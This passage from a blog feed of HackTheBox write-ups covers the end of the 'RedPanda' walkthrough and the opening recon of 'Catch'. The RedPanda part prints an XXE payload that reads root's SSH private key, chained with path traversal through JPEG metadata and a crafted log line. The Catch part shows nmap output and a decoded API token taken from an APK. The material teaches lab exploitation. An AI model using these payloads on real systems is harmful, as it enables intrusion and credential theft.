        <span class="nc">SAXBuilder</span> <span class="n">saxBuilder</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">SAXBuilder</span><span class="o">();</span>
        <span class="nc">XMLOutputter</span> <span class="n">xmlOutput</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XMLOutputter</span><span class="o">();</span>
        <span class="n">xmlOutput</span><span class="o">.</span><span class="na">setFormat</span><span class="o">(</span><span class="nc">Format</span><span class="o">.</span><span class="na">getPrettyFormat</span><span class="o">());</span>

        <span class="nc">File</span> <span class="n">fd</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">File</span><span class="o">(</span><span class="n">path</span><span class="o">);</span>
        
        <span class="nc">Document</span> <span class="n">doc</span> <span class="o">=</span> <span class="n">saxBuilder</span><span class="o">.</span><span class="na">build</span><span class="o">(</span><span class="n">fd</span><span class="o">);</span>
        
        <span class="nc">Element</span> <span class="n">rootElement</span> <span class="o">=</span> <span class="n">doc</span><span class="o">.</span><span class="na">getRootElement</span><span class="o">();</span>
 
        <span class="k">for</span><span class="o">(</span><span class="nc">Element</span> <span class="nl">el:</span> <span class="n">rootElement</span><span class="o">.</span><span class="na">getChildren</span><span class="o">())</span>
        <span class="o">{</span>
    
            
            <span class="k">if</span><span class="o">(</span><span class="n">el</span><span class="o">.</span><span class="na">getName</span><span class="o">()</span> <span class="o">==</span> <span class="s">"image"</span><span class="o">)</span>
            <span class="o">{</span>
                <span class="k">if</span><span class="o">(</span><span class="n">el</span><span class="o">.</span><span class="na">getChild</span><span class="o">(</span><span class="s">"uri"</span><span class="o">).</span><span class="na">getText</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="n">uri</span><span class="o">))</span>
                <span class="o">{</span>
                    <span class="nc">Integer</span> <span class="n">totalviews</span> <span class="o">=</span> <span class="nc">Integer</span><span class="o">.</span><span class="na">parseInt</span><span class="o">(</span><span class="n">rootElement</span><span class="o">.</span><span class="na">getChild</span><span class="o">(</span><span class="s">"totalviews"</span><span class="o">).</span><span class="na">getText</span><span class="o">())</span> <span class="o">+</span> <span class="mi">1</span><span class="o">;</span>
                    <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"Total views:"</span> <span class="o">+</span> <span class="nc">Integer</span><span class="o">.</span><span class="na">toString</span><span class="o">(</span><span class="n">totalviews</span><span class="o">));</span>
                    <span class="n">rootElement</span><span class="o">.</span><span class="na">getChild</span><span class="o">(</span><span class="s">"totalviews"</span><span class="o">).</span><span class="na">setText</span><span class="o">(</span><span class="nc">Integer</span><span class="o">.</span><span class="na">toString</span><span class="o">(</span><span class="n">totalviews</span><span class="o">));</span>
                    <span class="nc">Integer</span> <span class="n">views</span> <span class="o">=</span> <span class="nc">Integer</span><span class="o">.</span><span class="na">parseInt</span><span class="o">(</span><span class="n">el</span><span class="o">.</span><span class="na">getChild</span><span class="o">(</span><span class="s">"views"</span><span class="o">).</span><span class="na">getText</span><span class="o">());</span>
                    <span class="n">el</span><span class="o">.</span><span class="na">getChild</span><span class="o">(</span><span class="s">"views"</span><span class="o">).</span><span class="na">setText</span><span class="o">(</span><span class="nc">Integer</span><span class="o">.</span><span class="na">toString</span><span class="o">(</span><span class="n">views</span> <span class="o">+</span> <span class="mi">1</span><span class="o">));</span>
                <span class="o">}</span>
            <span class="o">}</span>
        <span class="o">}</span>
        <span class="nc">BufferedWriter</span> <span class="n">writer</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">BufferedWriter</span><span class="o">(</span><span class="k">new</span> <span class="nc">FileWriter</span><span class="o">(</span><span class="n">fd</span><span class="o">));</span>
        <span class="n">xmlOutput</span><span class="o">.</span><span class="na">output</span><span class="o">(</span><span class="n">doc</span><span class="o">,</span> <span class="n">writer</span><span class="o">);</span>
    <span class="o">}</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">JDOMException</span><span class="o">,</span> <span class="nc">IOException</span><span class="o">,</span> <span class="nc">JpegProcessingException</span> <span class="o">{</span>
        <span class="nc">File</span> <span class="n">log_fd</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">File</span><span class="o">(</span><span class="s">"/opt/panda_search/redpanda.log"</span><span class="o">);</span>
        <span class="nc">Scanner</span> <span class="n">log_reader</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Scanner</span><span class="o">(</span><span class="n">log_fd</span><span class="o">);</span>
        <span class="k">while</span><span class="o">(</span><span class="n">log_reader</span><span class="o">.</span><span class="na">hasNextLine</span><span class="o">())</span>
        <span class="o">{</span>
            <span class="nc">String</span> <span class="n">line</span> <span class="o">=</span> <span class="n">log_reader</span><span class="o">.</span><span class="na">nextLine</span><span class="o">();</span>
            <span class="k">if</span><span class="o">(!</span><span class="n">isImage</span><span class="o">(</span><span class="n">line</span><span class="o">))</span>
            <span class="o">{</span>
                <span class="k">continue</span><span class="o">;</span>
            <span class="o">}</span>
            <span class="nc">Map</span> <span class="n">parsed_data</span> <span class="o">=</span> <span class="n">parseLog</span><span class="o">(</span><span class="n">line</span><span class="o">);</span>
            <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">parsed_data</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">"uri"</span><span class="o">));</span>
            <span class="nc">String</span> <span class="n">artist</span> <span class="o">=</span> <span class="n">getArtist</span><span class="o">(</span><span class="n">parsed_data</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">"uri"</span><span class="o">).</span><span class="na">toString</span><span class="o">());</span>
            <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"Artist: "</span> <span class="o">+</span> <span class="n">artist</span><span class="o">);</span>
            <span class="nc">String</span> <span class="n">xmlPath</span> <span class="o">=</span> <span class="s">"/credits/"</span> <span class="o">+</span> <span class="n">artist</span> <span class="o">+</span> <span class="s">"_creds.xml"</span><span class="o">;</span>
            <span class="n">addViewTo</span><span class="o">(</span><span class="n">xmlPath</span><span class="o">,</span> <span class="n">parsed_data</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">"uri"</span><span class="o">).</span><span class="na">toString</span><span class="o">());</span>
        <span class="o">}</span>

    <span class="o">}</span>
<span class="o">}</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Looking at the <code class="language-plaintext highlighter-rouge">main()</code> function, it seems the app is processing <code class="language-plaintext highlighter-rouge">/opt/panda_search/redpanda.log</code>. Looking at the file perms, we can write to it because <code class="language-plaintext highlighter-rouge">woodenk</code> is in the <code class="language-plaintext highlighter-rouge">logs</code> group;</p>

<p><img src="/assets/img/20221126111945.png" alt="" /></p>

<p>Here is how the program works;</p>

<ol>
  <li>It reads the log file one line at a time. The log is expected to be in the format: <code class="language-plaintext highlighter-rouge">HTTP status code|| IP address || user agent || URI</code></li>
  <li>For each line, <code class="language-plaintext highlighter-rouge">parseLog()</code> is called, which parses the log into a <em>HashMap</em>.</li>
  <li>It then passes the value of <code class="language-plaintext highlighter-rouge">URI</code> to <code class="language-plaintext highlighter-rouge">getArtist()</code>, which directly append the given <code class="language-plaintext highlighter-rouge">URI</code> to <code class="language-plaintext highlighter-rouge">/opt/panda_search/src/main/resources/static</code> to load an image file using <code class="language-plaintext highlighter-rouge">JpegMetadataReader</code> (line 41 to 43). This makes it vulnerable to <em>path traversal</em>. This function returns the value of <code class="language-plaintext highlighter-rouge">Artist</code> metadata of the file as a string (line 48 to 51).</li>
  <li>The returned value by <code class="language-plaintext highlighter-rouge">getArtist()</code> is then prefixed with <code class="language-plaintext highlighter-rouge">/credits/</code> and suffixed with <code class="language-plaintext highlighter-rouge">_creds.xml</code> (line 102). This exposes another path traversal bug. This is very interesting because the function parses the file given to it as XML and update it’s contents. This opens a door for potential XXE exploit.</li>
</ol>

<p>To exploit this, I created a simple <code class="language-plaintext highlighter-rouge">.jpg</code> file and set it’s <code class="language-plaintext highlighter-rouge">Artist</code> metadata to <code class="language-plaintext highlighter-rouge">../../../../../../../dev/shm/pwn</code>;</p>

<p><img src="/assets/img/20221126114331.png" alt="" /></p>

<p>I then uploaded the image file as <code class="language-plaintext highlighter-rouge">/dev/shm/test.jpg</code>.</p>

<p>After studying the expected structure of the XML in the <code class="language-plaintext highlighter-rouge">addViewTo()</code> function, I wrote an XML file that will load the SSH key of the root user if it exists;</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
<span class="cp">&lt;!DOCTYPE foo [ &lt;!ENTITY val SYSTEM "file:///root/.ssh/id_rsa"&gt;</span>] &gt;
<span class="nt">&lt;credits&gt;</span>
  <span class="nt">&lt;author&gt;</span>author<span class="nt">&lt;/author&gt;</span>
  <span class="nt">&lt;image&gt;</span>
    <span class="nt">&lt;uri&gt;</span><span class="ni">&amp;val;</span><span class="nt">&lt;/uri&gt;</span>
    <span class="nt">&lt;views&gt;</span>7<span class="nt">&lt;/views&gt;</span>
  <span class="nt">&lt;/image&gt;</span>
  <span class="nt">&lt;totalviews&gt;</span>14<span class="nt">&lt;/totalviews&gt;</span>
<span class="nt">&lt;/credits&gt;</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>I uploaded the above file as <code class="language-plaintext highlighter-rouge">/dev/shm/pwn_creds.xml</code>, which will be what the program will resolve the <code class="language-plaintext highlighter-rouge">../../../../../../../dev/shm/pwn</code> payload added to the image metadata.</p>

<p>To trigger the exploit, I wrote the following line to the <code class="language-plaintext highlighter-rouge">redpanda.log</code>;</p>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>404||hecker.htb||master hecker||/../../../../../../dev/shm/test.jpg
</pre></td></tr></tbody></table></code></pre></div></div>

<p>After a few seconds, I checked the contents of the <code class="language-plaintext highlighter-rouge">pwn_creds.xml</code> file, and it was updated with the SSH key of the <code class="language-plaintext highlighter-rouge">root</code> user;</p>

<p><img src="/assets/img/20221126120131.png" alt="" /></p>

<p>I saved the key as <code class="language-plaintext highlighter-rouge">root.key</code> on my box, and was able to login and get root flag;</p>

<p><img src="/assets/img/20221126120358.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="summary">Summary</h3>
<p><br /></p>

<ul>
  <li>Discovered port <strong>22</strong> and <strong>8080</strong> using NMAP</li>
  <li>Port <strong>8080</strong> runs a web site with search feature.
    <ul>
      <li>Vulnerable to RCE using <em>Server-side Template Injection</em> to get a shell as <code class="language-plaintext highlighter-rouge">woodenk</code></li>
    </ul>
  </li>
  <li>Inside the box as <code class="language-plaintext highlighter-rouge">woodenk</code>;
    <ul>
      <li><code class="language-plaintext highlighter-rouge">woodenk</code> belongs to the group <code class="language-plaintext highlighter-rouge">logs</code>.</li>
      <li><code class="language-plaintext highlighter-rouge">pspy</code> picked up a custom Java program.</li>
      <li>Analyzed it’s source code and found a possible XXE.</li>
      <li>Exploited it to fetch the SSH key of the root user.</li>
    </ul>
  </li>
</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="hackthebox" /><category term="linux" /><category term="web" /><category term="ssti" /><category term="thymeleaf" /><category term="rce" /><category term="path traversal" /><category term="xxe" /><category term="custom exploitation" /><category term="java" /><category term="static analysis" /><summary type="html"><![CDATA[RedPanda is a very easy linux box. It starts with a web service that’s vulnerable to Server-side Template Injection (SSTI) using Thymeleaf to gain RCE. Privesc involves exploiting two (2) path path traversal vulnerabilites, and an XXE injection to read SSH key of root.]]></summary></entry><entry><title type="html">Catch - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/catch.html" rel="alternate" type="text/html" title="Catch - HackTheBox" /><published>2022-08-16T00:00:00+01:00</published><updated>2022-08-16T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/catch</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/catch.html"><![CDATA[<p><strong>Catch</strong> is a very interesting <em>medium-rated</em> linux box on <em>HackTheBox</em>. It starts with some light reversing of an android application to obtain an access token for the <em>Let’s Chat</em> API running on the host. This token will lead you to some credentials in the chat logs, which are reused in the <em>Cachet</em> instance running on the host, which you can exploit to leak the application config and obtain a password that was reused for SSH login. Once inside the box, you will be exploiting a custom cron job that process user controlled files in an unsafe way, leading to code execution as <code class="language-plaintext highlighter-rouge">root</code>.</p>

<p><br /></p>

<h3 id="info">Info</h3>
<p><br /></p>

<p><img src="/assets/img/20220317072018.png" alt="" /></p>

<p><img src="/assets/img/20220317072038.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="recon">Recon</h3>
<p><br /></p>

<h4 id="nmap">NMAP</h4>
<p><br /></p>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
</pre></td><td class="rouge-code"><pre># Nmap 7.70 scan initiated Mon Mar 14 06:44:58 2022 as: nmap -sC -sV -oN nmap.txt -v 10.10.11.150
Nmap scan report for catch.htb (10.10.11.150)
Host is up (0.36s latency).
Not shown: 995 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Catch Global Systems
3000/tcp open  ppp?
| fingerprint-strings: 
|   GenericLines, Help, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: i_like_gitea=f9ae0e9b88600477; Path=/; HttpOnly
|     Set-Cookie: _csrf=1thsrzl3dfhhgLXqP2EYU0Yr2VU6MTY0NzIzNjc0NjEwNzA3MDM1NQ; Path=/; Expires=Tue, 15 Mar 2022 05:45:46 GMT; HttpOnly; SameSite=Lax
|     Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly
|     X-Frame-Options: SAMEORIGIN
|     Date: Mon, 14 Mar 2022 05:45:46 GMT
|     &lt;!DOCTYPE html&gt;
|     &lt;html lang="en-US" class="theme-"&gt;
|     &lt;head data-suburl=""&gt;
|     &lt;meta charset="utf-8"&gt;
|     &lt;meta name="viewport" content="width=device-width, initial-scale=1"&gt;
|     &lt;meta http-equiv="x-ua-compatible" content="ie=edge"&gt;
|     &lt;title&gt; Catch Repositories &lt;/title&gt;
|     &lt;link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiQ2F0Y2ggUmVwb3NpdG9yaWVzIiwic2hvcnRfbmFtZSI6IkNhdGNoIFJlcG9zaXRvcmllcyIsInN0YXJ0X3VybCI6Imh0dHA6Ly9naXRlYS5jYXRjaC5odGI6MzAwMC8iLCJpY29ucyI6W3sic3JjIjoiaHR0cDovL2dpdGVhLmNhdGNoLmh0Yjoz
|   HTTPOptions: 
|     HTTP/1.0 405 Method Not Allowed
|     Set-Cookie: i_like_gitea=e96c0ccbcd15e95b; Path=/; HttpOnly
|     Set-Cookie: _csrf=idequJw78CbNGhYDHkv0-BdGyA06MTY0NzIzNjc1NDIxOTc0MjU3Nw; Path=/; Expires=Tue, 15 Mar 2022 05:45:54 GMT; HttpOnly; SameSite=Lax
|     Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly
|     X-Frame-Options: SAMEORIGIN
|     Date: Mon, 14 Mar 2022 05:45:54 GMT
|_    Content-Length: 0
5000/tcp open  upnp?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, RTSPRequest, SMBProgNeg, ZendJavaBridge: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   GetRequest: 
|     HTTP/1.1 302 Found
|     X-Frame-Options: SAMEORIGIN
|     X-Download-Options: noopen
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     Content-Security-Policy: 
|     X-Content-Security-Policy: 
|     X-WebKit-CSP: 
|     X-UA-Compatible: IE=Edge,chrome=1
|     Location: /login
|     Vary: Accept, Accept-Encoding
|     Content-Type: text/plain; charset=utf-8
|     Content-Length: 28
|     Set-Cookie: connect.sid=s%3AhXxhtsBrUI_XDU_i3ZgGjgu033W-HpWG.KVpt61zx0JMhA1rttVRXksZCCwcY0tu9zcySTvWADoI; Path=/; HttpOnly
|     Date: Mon, 14 Mar 2022 05:45:50 GMT
|     Connection: close
|     Found. Redirecting to /login
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     X-Frame-Options: SAMEORIGIN
|     X-Download-Options: noopen
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     Content-Security-Policy: 
|     X-Content-Security-Policy: 
|     X-WebKit-CSP: 
|     X-UA-Compatible: IE=Edge,chrome=1
|     Allow: GET,HEAD
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 8
|     ETag: W/"8-ZRAf8oNBS3Bjb/SU2GYZCmbtmXg"
|     Set-Cookie: connect.sid=s%3Aq0XcpC9e25YC_BRaqUaIpr7SAkXEtcer.%2BQNjRwdTsHh5gZU8NxXCD0%2F02xispYhj9lSo2TGZgmQ; Path=/; HttpOnly
|     Vary: Accept-Encoding
|     Date: Mon, 14 Mar 2022 05:45:55 GMT
|     Connection: close
|_    GET,HEAD
8000/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 69A0E6A171C4ED8855408ED902951594
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Catch Global Systems
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============

---[snip]---

SF:"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Mar 14 06:47:39 2022 -- 1 IP address (1 host up) scanned in 161.48 seconds
</pre></td></tr></tbody></table></code></pre></div></div>

<p><br /></p>

<h4 id="web-services">Web Services</h4>
<p><br /></p>

<p>The main service on port <strong>80</strong> appears to be static, with a download link to an APK file;</p>

<p><img src="/assets/img/20220317072352.png" alt="" /></p>

<p><br /></p>

<h4 id="gitea">Gitea</h4>
<p><br /></p>

<p>The service on port <strong>3000</strong> is an instance of <em>Gitea</em> version <strong>1.14.1</strong>;</p>

<p><img src="/assets/img/20220317072552.png" alt="" /></p>

<p>Viewing the source of the page showed a subdomain;</p>

<p><img src="/assets/img/20220317072626.png" alt="" /></p>

<p>Trying common usernames and passwords in the login page didn’t work. Only one user was found in the <em>explore</em> tab, and doesn’t have any repo;</p>

<p><img src="/assets/img/20220317073022.png" alt="" /></p>

<p><br /></p>

<h4 id="lets-chat">Let’s Chat</h4>
<p><br /></p>

<p>The service on port <strong>5000</strong> is an instance of <em>Let’s Chat</em>, which is available at https://github.com/sdelements/lets-chat. This is a <em>self-hosted chat app for small teams</em>;</p>

<p><img src="/assets/img/20220317073230.png" alt="" /></p>

<p>Testing simple usernames and passwords in the login page didn’t yield anything.</p>

<p><br /></p>

<h4 id="cachet">Cachet</h4>
<p><br /></p>

<p>The service on port <strong>8000</strong> is an instance of <em>Cachet</em>, and according to it’s GitHub page, it is a <em>a beautiful and powerful open source status page system</em>;</p>

<p><img src="/assets/img/20220317073639.png" alt="" /></p>

<p>At the bottom of the page, there is a link to <code class="language-plaintext highlighter-rouge">/dashboard</code> and <code class="language-plaintext highlighter-rouge">/subscribe</code>. The <code class="language-plaintext highlighter-rouge">/subscribe</code> page gave a <strong>500</strong> internal server error, while the <code class="language-plaintext highlighter-rouge">/dashboard</code> redirected to <code class="language-plaintext highlighter-rouge">/auth/login</code>, which gave a login form;</p>

<p><img src="/assets/img/20220317073824.png" alt="" /></p>

<p>Some quick searches showed that this service is vulnerable to unauthenticated SQL injection;</p>

<p><img src="/assets/img/20220317074030.png" alt="" /></p>

<p>I looked for any sort of PoC for this vulnerability, but I couldn’t find any. So I installed the application locally to see if I can figure it out, but I couldn’t. The vulnerable function is defined in <code class="language-plaintext highlighter-rouge">app/Models/Traits/SearchableTrait.php</code>;</p>

<p><img src="/assets/img/20220317074417.png" alt="" /></p>

<p>I modified this code in an attempt to see when it’s being used, but that didn’t work. So I just moved on.</p>

<p><br /></p>

<hr />
<h3 id="apk-reversing">APK Reversing</h3>
<p><br /></p>

<p>The homepage of the main site links to an APK file at <code class="language-plaintext highlighter-rouge">/catchv1.0.apk</code>. I checked for other APK files that may exist on the server by bruteforcing the version number, but none was found.</p>

<p>I used <code class="language-plaintext highlighter-rouge">apktool</code> to unpack the APK file, which will give me the decoded resources used by the app, but the code will all be in <code class="language-plaintext highlighter-rouge">.smali</code>;</p>

<p><img src="/assets/img/20220317075305.png" alt="" /></p>

<p>Using <code class="language-plaintext highlighter-rouge">unzip</code>, I extracted the APK file to obtain the <code class="language-plaintext highlighter-rouge">.dex</code> file;</p>

<p><img src="/assets/img/20220317075454.png" alt="" /></p>

<p>Using <code class="language-plaintext highlighter-rouge">dex2jar</code>, I converted the <code class="language-plaintext highlighter-rouge">.dex</code> file into <code class="language-plaintext highlighter-rouge">.jar</code>, and decompiled it using <code class="language-plaintext highlighter-rouge">cfr</code>;</p>

<p><img src="/assets/img/20220317075623.png" alt="" />
<img src="/assets/img/20220317075907.png" alt="" /></p>

<p>As per the <em>AndroidManifest.xml</em> fille decoded by <code class="language-plaintext highlighter-rouge">apktool</code>, the class <code class="language-plaintext highlighter-rouge">com.example.acatch.MainActivity</code> is the main activity of the application, which is the class that will be called when the application is launched;</p>

<p><img src="/assets/img/20220317080133.png" alt="" /></p>

<p>The application appears to be an android webview application, which is a technology used by android apps that make them act like browsers for accessing websites. Looking through the code, a HTTPs URL was found;</p>

<p><img src="/assets/img/20220317080453.png" alt="" /></p>

<p>This doesn’t make sense because port <strong>443</strong> is not open on the server;</p>

<p><img src="/assets/img/20220317080601.png" alt="" /></p>

<p>Going to the subdomain over HTTP also showed the exact same homepage.</p>

<p>I made a mistake at this stage of the box and just ignored the APK, since the main class doesn’t appear to be doing anything more than viewing that URL, which isn’t even valid. As it turns out, there are some very interesting entries in the XML file <code class="language-plaintext highlighter-rouge">res/values/strings.xml</code>, which is used by android to define strings in key-value mappings that make it easy to reuse data throughout the application. Going through the file, I found some very interesting entries;</p>

<p><img src="/assets/img/20220317081525.png" alt="" /></p>

<p>The token for <em>Gitea</em> just didn’t work, so I’m guessing it had been revoked. The token for <em>Let’s Chat</em> is a base64 string, so I decoded it, which gave me <code class="language-plaintext highlighter-rouge">61b86aead984e2451036eb16:d588468ff8bae446379a57fa2b4e63a2368224336b5949c5</code>. This sort of token format is usually used in HTTP <em>Authorization: bearer</em> header, which contains the username and password separated by a colon. Testing the values as username and password in the login form of <em>Let’s Chat</em> didn’t work. So I tried passing the token in the <em>authorization</em> header, and it appeared to work, but just hanged;</p>

<p><img src="/assets/img/20220317082420.png" alt="" /></p>

<p>Viewing the source code of the page, the authentication appeared to have worked;</p>

<p><img src="/assets/img/20220317082543.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="lets-chat-1">Let’s Chat</h3>
<p><br /></p>

<p>Let’s Chat has a powerful API, and it’s documentation is available at https://github.com/sdelements/lets-chat/wiki/API. With the help of the guide, I was able to enumerate valid users;</p>

<p><img src="/assets/img/20220317083058.png" alt="" /></p>

<p>This gave me four usernames: <code class="language-plaintext highlighter-rouge">admin</code>, <code class="language-plaintext highlighter-rouge">john</code>, <code class="language-plaintext highlighter-rouge">will</code>, and <code class="language-plaintext highlighter-rouge">lucas</code>. There are 3 rooms in the chat service, none of which are password-protected;</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
</pre></td><td class="rouge-code"><pre><span class="p">[</span><span class="w">
  </span><span class="p">{</span><span class="w">
    </span><span class="nl">"id"</span><span class="p">:</span><span class="w"> </span><span class="s2">"61b86b28d984e2451036eb17"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"slug"</span><span class="p">:</span><span class="w"> </span><span class="s2">"status"</span><span class="p">,</span><span class="w">                                                                                                                 
    </span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Status"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"description"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Cachet Updates and Maintenance"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"lastActive"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2021-12-14T10:34:20.749Z"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"created"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2021-12-14T10:00:08.384Z"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"owner"</span><span class="p">:</span><span class="w"> </span><span class="s2">"61b86aead984e2451036eb16"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"private"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
    </span><span class="nl">"hasPassword"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
    </span><span class="nl">"participants"</span><span class="p">:</span><span class="w"> </span><span class="p">[]</span><span class="w">
  </span><span class="p">},</span><span class="w">
  </span><span class="p">{</span><span class="w">
    </span><span class="nl">"id"</span><span class="p">:</span><span class="w"> </span><span class="s2">"61b8708efe190b466d476bfb"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"slug"</span><span class="p">:</span><span class="w"> </span><span class="s2">"android_dev"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Android Development"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"description"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Android App Updates, Issues &amp; More"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"lastActive"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2021-12-14T10:24:21.145Z"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"created"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2021-12-14T10:23:10.474Z"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"owner"</span><span class="p">:</span><span class="w"> </span><span class="s2">"61b86aead984e2451036eb16"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"private"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">                                                                                                                 
    </span><span class="nl">"hasPassword"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">                                                                                                             
    </span><span class="nl">"participants"</span><span class="p">:</span><span class="w"> </span><span class="p">[]</span><span class="w">
  </span><span class="p">},</span><span class="w">
  </span><span class="p">{</span><span class="w">                                   
    </span><span class="nl">"id"</span><span class="p">:</span><span class="w"> </span><span class="s2">"61b86b3fd984e2451036eb18"</span><span class="p">,</span><span class="w">                    
    </span><span class="nl">"slug"</span><span class="p">:</span><span class="w"> </span><span class="s2">"employees"</span><span class="p">,</span><span class="w">                               
    </span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Employees"</span><span class="p">,</span><span class="w">                 
    </span><span class="nl">"description"</span><span class="p">:</span><span class="w"> </span><span class="s2">"New Joinees, Org updates"</span><span class="p">,</span><span class="w">       
    </span><span class="nl">"lastActive"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2021-12-14T10:18:04.710Z"</span><span class="p">,</span><span class="w">             
    </span><span class="nl">"created"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2021-12-14T10:00:31.043Z"</span><span class="p">,</span><span class="w">                                                                                            
    </span><span class="nl">"owner"</span><span class="p">:</span><span class="w"> </span><span class="s2">"61b86aead984e2451036eb16"</span><span class="p">,</span><span class="w"> 
    </span><span class="nl">"private"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
    </span><span class="nl">"hasPassword"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
    </span><span class="nl">"participants"</span><span class="p">:</span><span class="w"> </span><span class="p">[]</span><span class="w">
  </span><span class="p">}</span><span class="w">
</span><span class="p">]</span><span class="w">
</span></pre></td></tr></tbody></table></code></pre></div></div>

<p>Dumping the messages in the first channel gave a credential;</p>

